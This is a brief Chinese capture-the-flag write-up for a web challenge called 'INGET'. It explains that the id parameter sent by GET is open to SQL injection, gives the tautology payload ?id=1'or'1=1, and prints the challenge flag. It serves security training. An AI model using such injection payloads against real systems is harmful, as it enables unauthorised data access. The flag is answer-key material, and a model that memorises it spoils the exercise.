# INGET

## 分析

> 根据提示,是通过get方式传入id参数,考察的便是sql注入,可以用sql注入直接跑数据,也可以手工测试,经测试1'or'1=1就可以获取flag

## payload

> ?id=1'or'1=1

## flag

> cyberpeace{c7af44e3f32dcddca545b158e5dd6c58}